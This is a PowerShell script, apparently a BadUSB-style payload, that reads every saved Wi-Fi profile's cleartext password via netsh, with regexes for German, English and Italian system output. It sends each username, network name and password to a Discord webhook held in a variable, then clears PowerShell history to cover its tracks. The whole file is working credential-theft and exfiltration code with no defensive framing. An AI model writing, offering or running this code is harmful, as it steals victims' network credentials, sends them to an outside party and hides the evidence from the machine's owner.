# Determine system language
$language = (Get-Culture).TwoLetterISOLanguageName

switch ($language) {
    'de' { # German
        $userProfileString = '(?<=Profil für alle Benutzer\s+:\s).+'
        $keyContentString = '(?<=Schlüsselinhalt\s+:\s).+'
    }
    'en' { # English
        $userProfileString = '(?<=All User Profile\s+:\s).+'
        $keyContentString = '(?<=Key Content\s+:\s).+'
    }
    'it' { # Italian
        $userProfileString = '(?<=Tutti i profili utente\s+:\s).+'
        $keyContentString = '(?<=Contenuto chiave\s+:\s).+'
    }
    default { # Default to English if language is not supported
        $userProfileString = '(?<=All User Profile\s+:\s).+'
        $keyContentString = '(?<=Key Content\s+:\s).+'
    }
}

netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String $keyContentString

    $Body = @{
        'username' = $env:username + " | " + [string]$wlan
        'content' = [string]$passw
    }
    
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
}

# Clear the PowerShell command history
Clear-History
